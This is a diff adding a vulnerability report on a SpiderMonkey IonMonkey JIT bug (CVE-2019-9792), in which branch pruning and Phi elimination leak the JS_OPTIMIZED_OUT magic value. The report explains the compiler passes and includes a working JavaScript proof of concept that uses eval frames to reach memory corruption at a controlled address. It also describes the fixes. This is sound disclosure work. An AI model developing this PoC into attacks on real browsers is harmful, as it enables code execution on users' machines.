@@ -1,0 +1,373 @@
+IonMonkey can, during a bailout, leak an internal JS_OPTIMIZED_OUT magic value to the running script. This magic value can then be used to achieve memory corruption.
+
+# Prerequisites
+
+## Magic Values
+
+Spidermonkey represents JavaScript values with the C++ type JS::Value [1], which is a NaN-boxed value that can encode a variety of different types [2] such as doubles, string pointers, integers, or object pointers. Besides the types available in JavaScript, JS::Value can also store special ("magic") [3] values for various internal purposes. For example, JS_ELEMENTS_HOLE is used to represent holes in arrays, and JS_OPTIMIZED_ARGUMENTS represents the `arguments` object during a function call (so that no actual memory allocation is required for it).
+
+## Branch Pruning
+
+IonMonkey (Spidermonkey's JIT engine) represents JavaScript code as a control-flow graph (CFG) of MIR (mid-level IR) instructions. When starting to compile a function, IonMonkey first translates the bytecode to the MIR, keeping the same CFG. Afterwards, it tries to remove subtrees in the CFG that appear to not be used in order to save compilation time and potentially improve various optimizations. As an example, consider the following code, and assume further that in all previous executions only the if branch had been taken:
+
+    if (cond_that_has_always_been_true) {
+        // do something
+    } else {
+        // do something else
+    }
+
+In this case, branch pruning would likely decide to discard the else branch entirely and instead replace it with a bailout instruction to bailout to the baseline JIT should the branch ever be taken:
+
+    if (cond_that_has_always_been_true) {
+        // do something
+    } else {
+        bailout();      // will continue execution in baseline JIT
+    }
+
+## Phi Elimination
+
+IonMonkey uses static single assignment (SSA) form for its intermediate representation of the code (MIR). In SSA form, every variable is assigned exactly once. Reassignments of variables on different branches in the CFG are handled with special Phi instructions. Consider the following example:
+
+    var x;
+    if (c) {
+        x = 1337;
+    } else {
+        x = 1338;
+    }
+    print(x);
+
+After translation to SSA form it would look something like this:
+
+    if (c) {
+        x1 = 1337;
+    } else {
+        x2 = 1338;
+    }
+    x3 = Phi(x1, x2);
+    print(x3);
+
+Phi Elimination is an optimization pass that tries to remove Phi instructions that are either redundant or unobservable (which frequently appear as result of SSA conversion and various optimizations). Quoting from the source code [4]:
+
+    // Eliminates redundant or unobservable phis from the graph.  A
+    // redundant phi is something like b = phi(a, a) or b = phi(a, b),
+    // both of which can be replaced with a.  An unobservable phi is
+    // one that whose value is never used in the program.
+
+Unobservable Phis are then replaced a special value, MagicOptimizedOut [5]. In case of a bailout from the JIT, such an optimized-out value will be materialized as a JS_OPTIMIZED_OUT [6] JS magic value. This should not be observable by script since the compiler was able to prove that the variable is never used. Spidermonkey can, however, not simply leave the slot for an optimized-out variable uninitialized as e.g. the garbage collector expects a valid JS::Value in it.
+
+Phi elimination can lead to problems in combination with branch pruning. Consider the following example:
+
+    var only_used_in_else_branch = ...;
+    if (cond_that_has_always_been_true) {
+        // do something, but don't use only_used_in_else_branch
+    } else {
+        // do something else and use only_used_in_else_branch
+    }
+
+Here again, branch pruning might decide to remove the else branch, in which case no use of the variable remains. As such, it would be replaced by a magic JS constant (JS_OPTIMIZED_OUT) in the JIT. Later, if the else branch was actually taken, the JIT code would perform a bailout and try to restore the variable. However, as it has been removed, it would now (incorrectly) restore it as JS_OPTIMIZED_OUT magic and continue using it in the baseline JIT, where it could potentially be observed by the executing script. To avoid this, branch pruning marks SSA variables that are used in removed blocks as "useRemoved" [7], in which case the variables will not be optimized out [8].
+
+# Bug description
+
+While fuzzing Spidermonkey, I encountered the following sample which crashes Spidermonkey built from the current release branch:
+
+	function poc() {
+		const x = "asdf";
+		for (let v7 = 0; v7 < 2; v7++) {
+			function v8() {
+				let v13 = 0;
+				do {
+					v13++;
+				} while (v13 < 1200000);
+			}
+			const v15 = v8();
+			for (let v25 = 0; v25 < 100000; v25++) {
+				if (x) {
+				} else {
+					const v26 = {get:v8};
+					for (let v30 = 0; v30 < 1000; v30++) { }
+				}
+			}
+		}
+	}
+	poc();
+
+It appears what is happening here is roughly the following:
+
+At the beginning of JIT compilation (somewhere in one of the inner loops), IonMonkey produces the following simplified CFG (annotated with the different SSA variables for x):
+
+          +-------+
+          |   0   +-----+
+          | Entry |     |
+          +-------+     |
+      x1 = "asdf"       v
+                    +-----------+
+                    |     1     |
+   +--------------->| Loop Head |
+   |                +--+--------+
+   |                   |  x2 = Phi(x1, x5)
+   |                   +--------+
+   |                            v
+   |   +-----------+     +------------+
+   |   |     3     |     |    2...    |
+   |   | OSR Entry |     | Inlined v8 |
+   |   +-+---------+     +----------+-+
+   |     | x3 = osrval('x')         |
+   |     +---------+     +----------+
+   |               v     v
+   |           +-------------+
+   |           |      4      |
+   |           |    Merge    |
+   |           +-----------+-+
+   |      x4 = Phi(x3, x2) |
+   |                       v
+   |           +-------------+
+   |           |    5...     |
+   +-----------+ Inner Loop  |
+               +-------------+
+             x5 = Phi(x4, ..); use(x5);
+
+Since the function is already executing in the baseline JIT, the JIT code compiled by IonMonkey will likely be entered via OSR at block 3 in the middle of the outer loop.
+Next, branch pruning runs. It inspects the hit count of the bytecode (and performs some more heuristics), and decides that block 2 (or really the exit from the loop in v8) should be pruned and replaced with a bailout to the baseline JIT. The CFG then looks something like this:
+
+          +-------+
+          |   0   +-----+
+          | Entry |     |
+          +-------+     |
+      x1 = "asdf"       v
+                    +-----------+
+                    |     1     |
+   +--------------->| Loop Head |
+   |                +--+--------+
+   |                   |  x2 = Phi(x1, x5)
+   |                   +--------+
+   |                            v
+   |   +-----------+     +------------+
+   |   |     3     |     |    2...    |
+   |   | OSR Entry |     | Inlined v8 |
+   |   +-+---------+     +------------+
+   |     | x3 = osrval(1)
+   |     +---------+        !! branch pruned !!
+   |               v
+   |           +-------------+
+   |           |      4      |
+   |           |    Merge    |
+   |           +-----------+-+
+   |      x4 = Phi(x3)     |
+   |                       v
+   |           +-------------+
+   |           |    5...     |
+   +-----------+ Inner Loop  |
+               +-------------+
+             x5 = Phi(x4, ..); use(x5);
+
+Since there was no use of x2 in the removed code, x2 is not marked as "use removed". However, when removing the branch 2 -> 4, IonMonkey removed x2 as input to the Phi for x4. This seems logical since x2 can now definitely not flow into x4 since there is no longer a path between block 1 and block 4. However, this removal of a use without setting the "use removed" flag leads to problems later on, in particular during Phi Elimination, which changes the code to the following:
+
+          +-------+
+          |   0   +-----+
+          | Entry |     |
+          +-------+     |
+      x1 = "asdf"       v
+                    +-----------+
+                    |     1     |
+   +--------------->| Loop Head |
+   |                +--+--------+
+   |                   |  x2 = OPTIMIZED_OUT
+   |                   +--------+
+   |                            v
+   |   +-----------+     +------------+
+   |   |     3     |     |    2...    |
+   |   | OSR Entry |     | Inlined v8 |
+   |   +-+---------+     +------------+
+   |     | x3 = osrval(1)
+   |     +---------+        !! branch pruned !!
+   |               v
+   |           +-------------+
+   |           |      4      |
+   |           |    Merge    |
+   |           +-----------+-+
+   |      x4 = Phi(x3)     |
+   |                       v
+   |           +-------------+
+   |           |    5...     |
+   +-----------+ Inner Loop  |
+               +-------------+
+             x5 = Phi(x4, ..); use(x5);
+
+Here, Phi Elimination decided that x2 is an unobservable Phi as it is not used anywhere. As such, it replaces it with a MagicOptimizedOut value. However, when block 2 is executed in the JITed code, it will perform a bailout and restore x as JS_OPTIMIZED_OUT magic value. This is incorrect as the interpreter/baseline JIT will use x once it reaches the inner loop. There, x (now the optimized out magic) is used for a ToBoolean conversion, which crashes (in a non exploitable way) when reaching this code:
+
+    JS_PUBLIC_API bool js::ToBooleanSlow(HandleValue v) {
+      ...;
+      MOZ_ASSERT(v.isObject());
+      return !EmulatesUndefined(&v.toObject());     // toObject will return an invalid pointer for a magic value
+    }
+
+
+A similar scenario is described in FlagPhiInputsAsHavingRemovedUses [9], which is apparently supposed to prevent this from happening by marking x2 as useRemoved during branch pruning. However, in this case, FlagPhiInputsAsHavingRemovedUses fails to mark x2 as useRemoved as it concludes that x4 is also unused: basically, FlagPhiInputsAsHavingRemovedUses invokes DepthFirstSearchUse [10] to figure out whether some Phi is used by performing a depth-first search over all uses. If it finds a non-Phi use, it returns true. In block 5 above (which are really multiple blocks), x4 is used by another Phi, x5, which is then used by a "real" instruction. DepthFirstSearchUse now visits x5 and puts it into the worklist. It then eventually finds x4 and:
+
+* finds x5 as use, but as x5 is already in the worklist it skips it [11]
+* finds no other uses, and thus (incorrectly?) marks x4 as unused [12]
+
+As such, x2 is later on not marked as useRemove since its only use (x4) appears to be unused anyways.
+
+# Exploitation
+
+It is possible get a reference to the magic JS_OPTIMIZED_OUT value by changing the body of the inner for loop to something like this:
+
+        for (let v25 = 0; v25 < 100000; v25++) {
+            // Should never be taken, but will be after triggering the bug (because both v3 and v1
+            // will be a JS_OPTIMIZED_OUT magic value).
+            if (v3 === v1) {
+                let magic = v3;
+                console.log("Magic is happening!");
+                // do something with magic
+                return;
+            }
+            if (v1) {
+            } else {
+                const v26 = {get:v8};
+                for (let v30 = 0; v30 < 1000; v30++) { }
+            }
+        }
+
+Afterwards, the magic value will be stored in a local variable and can be freely used. What remains now is a way to use the magic value to cause further misbehaviour in the engine.
+
+Spidermonkey uses different JSMagic values in various places. These places commonly check for the existence of some specific magic value by calling `.isMagic(expectedMagicType)` on the value in question. For example, to check for the magic hole element, the code would invoke `elem.isMagic(JS_ELEMENTS_HOLE)`. The implementation of `isMagic` is shown below:
+
+  bool isMagic(JSWhyMagic why) const {
+    MOZ_ASSERT_IF(isMagic(), s_.payload_.why_ == why);
+    return isMagic();
+  }
+
+Interestingly, this way of implementing it makes it possible to supply a different magic value than the expected one while still causing this function to return true, thus making the caller believe that it has the right magic value. As such, the JS_OPTIMIZED_OUT magic value can, in many cases, be used as any other magic value in the code.
+
+One interesting use of magic values is JS_OPTIMIZED_ARGUMENTS, representing the `arguments` object. The idea is that e.g.
+
+    function foo() {
+        print(arguments[0]);
+    }
+
+Gets compiled to bytecode such as:
+
+    push JS_OPTIMIZED_ARGUMENTS
+    LoadElem 0
+    call print
+
+The special handling for the magic value is then performed here:
+
+    static bool DoGetElemFallback(JSContext* cx, BaselineFrame* frame,
+                                  ICGetElem_Fallback* stub, HandleValue lhs,
+                                  HandleValue rhs, MutableHandleValue res) {
+      // ...
+
+      bool isOptimizedArgs = false;
+      if (lhs.isMagic(JS_OPTIMIZED_ARGUMENTS)) {
+        // Handle optimized arguments[i] access.
+        if (!GetElemOptimizedArguments(cx, frame, &lhsCopy, rhs, res,
+                                       &isOptimizedArgs)) {
+          return false;
+        }
+
+      // ...
+
+Which eventually ends up in:
+
+    inline Value& InterpreterFrame::unaliasedActual(
+      unsigned i, MaybeCheckAliasing checkAliasing) {
+        MOZ_ASSERT(i < numActualArgs());
+        MOZ_ASSERT_IF(checkAliasing, !script()->argsObjAliasesFormals());
+        MOZ_ASSERT_IF(checkAliasing && i < numFormalArgs(),
+                      !script()->formalIsAliased(i));
+        return argv()[i];         // really is just argv_[i];
+    }
+
+An InterpreterFrame [13] is an object representing the invocation context of a JavaScript function.
+Basically, there are two types of InterpreterFrames: CallFrames [14], which are used for regular function calls and thus has nactul_ (the number of arguments) and argv_ (a pointer to the argument values) initialized, and ExecuteFrame [15], which are e.g. used for eval()ed code. Interestingly, ExecuteFrames leave nactual_ and argv_ uninitialized, which is normally fine as code would never access these fields in an ExecuteFrame. However, by having a reference to a magic value, it now becomes possible to trick the engine into believing that whatever frame is currently active is a CallFrame and thus has a valid argv_ pointer by loading an element from the magic value (`magic[i]` in JS). Conveniently, InterpreterFrames are allocated by a bump allocator, used solely for the interpreter stack. As such, the allocations are very deterministic and it is easily possible to overlap the uninitialized member with any other data that is stored on the interpreter stack, such as local variables of functions.
+
+The following PoC (tested against a local Spidermonkey build and Firefox 65.0.1) demonstrates this. It will first trigger the bug to leak the magic JS_OPTIMIZED_OUT value. Afterwards, it puts a controlled value (0x414141414141 in binary) on the interpreter stack (in fill_stack), then uses the magic value from inside an eval frame of which the argv_ pointer overlaps with the controlled value. Spidermonkey will then assume that the current frame must be a FunctionFrame and treat the value as an argv_ pointer, thus crashing at 0x414141414141.
+
+    // This function uses roughly sizeof(InterpreterFrame) + 14 * 8 bytes of interpreter stack memory.
+    function fill_stack() {
+        // Use lot's of stack slots to increase the allocation size of this InterpreterFrame.
+        var v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13;
+        // Will overlap with the argv_ pointer in the InterpreterFrame for the call to eval.
+        var v14 = 3.54484805889626e-310;
+    }
+
+    // This function uses roughly sizeof(InterpreterFrame) bytes of interpreter stack memory. The inner
+    // call to eval will get its own InterpreterFrame, which leaves the argv_ pointer uninitialized
+    // (since it's an eval frame). However, due to having a magic value here, it is possible to trick
+    // the interpreter into accessing argv_ (because it assumes that the magic value represents an
+    // `arguments` object). The argv_ pointer of the inner frame will then overlap with one of the
+    // variables of the previous function, and is thus fully controllable.
+    function trigger(magic) {
+        eval(`magic[0]`);
+    }
+
+    // Invoke the two functions above to achieve memory corruption given a magic JS::Value.
+    function hax(magic) {
+        fill_stack();
+        trigger(magic);
+    }
+
+    function pwn() {
+        const v1 = "adsf";
+        const v3 = "not_asdf";
+        for (let v7 = 0; v7 < 2; v7++) {
+            function v8() {
+                let v13 = 0;
+                do {
+                    v13++;
+                } while (v13 < 1200000);
+                // If the previous loop runs long enough, IonMonkey will JIT compile v8 and enter the
+                // JITed code via OSR. This will leave the hitCount for the loop exit in the interpreter
+                // at 0 (because the exit is taken in JITed code). This in turn will lead to IonMonkey
+                // pruning the loop exit when compiling pwn() (with inlined v8), as its heuristics
+                // suggest that the branch is never taken (hitCount == 0 and a few more). This will then
+                // lead to the incorrect removal of Phi nodes, and ultimately the leaking of a
+                // JS_OPTMIZED_OUT magic value to the baseline JIT, where it is observable for the
+                // current script.
+            }
+            const v15 = v8();
+            for (let v25 = 0; v25 < 100000; v25++) {
+                // Should never be taken, but will be after triggering the bug (because both v3 and v1
+                // will be a JS_OPTIMIZED_OUT magic value).
+                if (v3 === v1) {
+                    let magic = v3;
+                    console.log("Magic is happening!");
+                    hax(magic);
+                    return;
+                }
+                if (v1) {
+                } else {
+                    const v26 = {get:v8};
+                    for (let v30 = 0; v30 < 1000; v30++) { }
+                }
+            }
+        }
+    }
+    pwn();
+
+[1]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L276
+[2]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L53
+[3]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L191
+[4]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L1382
+[5]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonTypes.h#L447
+[6]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/public/Value.h#L223
+[7]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/MIR.h#L129
+[8]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L1330
+[9]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L146
+[10]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L41
+[11]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L106
+[12]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/jit/IonAnalysis.cpp#L135
+[13]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/vm/Stack.h#L85
+[14]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/vm/Stack-inl.h#L51
+[15]  https://github.com/mozilla/gecko-dev/blob/cfffcfb4c03737d963945c2025bbbe75beef45c6/js/src/vm/Stack.cpp#L35
+
+
+Fixed in  https://www.mozilla.org/en-US/security/advisories/mfsa2019-08/#CVE-2019-9792
+
+The issue was fixed in two ways:
+
+1. In  https://hg.mozilla.org/releases/mozilla-beta/rev/5f4ba71d48892ddfc9e800aec521a46eaae175fd the debug assertion in isMagic was changed into a release assert, preventing the exploitation of leaked JS_MAGIC values as described above.
+
+2. In  https://hg.mozilla.org/mozilla-central/rev/044a64c70a3b the DFS in DepthFirstSearchUse was modified to (conservatively) mark Phis in loops as used. A more complex implementation which can correctly determine whether Phis inside loops are actually used remains as a separate bug.
